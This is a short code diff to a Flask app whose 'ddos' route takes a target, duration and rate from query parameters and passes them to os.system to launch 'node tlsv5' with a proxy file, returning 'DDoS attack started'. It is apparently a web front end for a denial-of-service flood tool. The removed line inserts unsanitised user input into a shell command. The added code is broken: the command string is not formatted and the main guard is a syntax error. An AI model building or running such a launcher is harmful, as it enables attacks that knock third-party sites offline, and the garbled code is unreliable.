@@ -1,4 +1,4 @@
-from flask import Flask
+from flask import Flask, request
 import os
 
 app = Flask(__name__)
@@ -8,11 +8,9 @@ def ddos():
     target = request.args.get('target', 'example.com')
     duration = request.args.get('duration', '10')
     rate = request.args.get('rate', '100')
-
-    command = f"node tlsv5.js ${target} ${duration} ${rate} 25 p.txt"
-    os.system(command)
+    os.system("node tlsv5 {target} {duration} {rate} 24 p.txt")
 
     return 'DDoS attack started'
 
-if __name__ == '__main__':
+if __name__ == __main__
     app.run(host='localhost', port=3000)
